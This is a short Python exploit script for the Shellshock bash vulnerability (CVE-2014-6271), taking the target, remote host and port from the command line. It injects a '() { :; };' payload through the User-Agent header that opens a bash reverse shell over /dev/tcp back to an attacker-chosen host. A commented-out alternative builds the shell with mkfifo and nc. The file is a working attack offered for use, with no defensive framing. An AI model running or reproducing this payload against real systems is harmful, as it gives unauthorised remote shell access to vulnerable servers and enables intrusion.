import requests
import argparse
from log_colors import *

# CVE-2014-6271 - Shellshock
class Shellshock():
    def __init__(self, target, host, port):
        self.url = url
        self.host, self.port = host, port
        self.session = requests.Session()

    # exploit
    def run(self):
        print (LogColors.BLUE + "run reverse shell " + self.host + ":" + self.port + "..." + LogColors.ENDC)
        #reverse_shell = "() { :; }; /bin/bash"
        #reverse_shell += " -c '/bin/rm -f /tmp/f;"
        #reverse_shell += " /usr/bin/mkfifo"
        #reverse_shell += " /tmp/f;cat /tmp/f |"
        #reverse_shell += " /bin/sh -i 2>&1 |"
        #reverse_shell += " nc -l %s %s > /tmp/f'" % (self.host, self.port)

        reverse_shell = "() { :; }; /bin/bash -i "
        reverse_shell += '>& /dev/tcp/{}/{} 0>&1'.format(self.host, self.port)

        print (LogColors.YELLOW + "shell: " + reverse_shell + LogColors.ENDC)
        headers = {"User-Agent" : reverse_shell}
        
        r = self.session.get(self.url, headers = headers)
        print (LogColors.YELLOW + str(r.status_code) + LogColors.ENDC)
        print (LogColors.YELLOW + r.text + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target url")
    parser.add_argument('-r', '--remote', required = True, help = "remote host")
    parser.add_argument('-p', '--port', required = True, help = "port with a shell")
    args = vars(parser.parse_args())
    url = args['target']
    host, port = args['remote'], args['port']
    cve = Shellshock(url, host, port)
    cve.run()

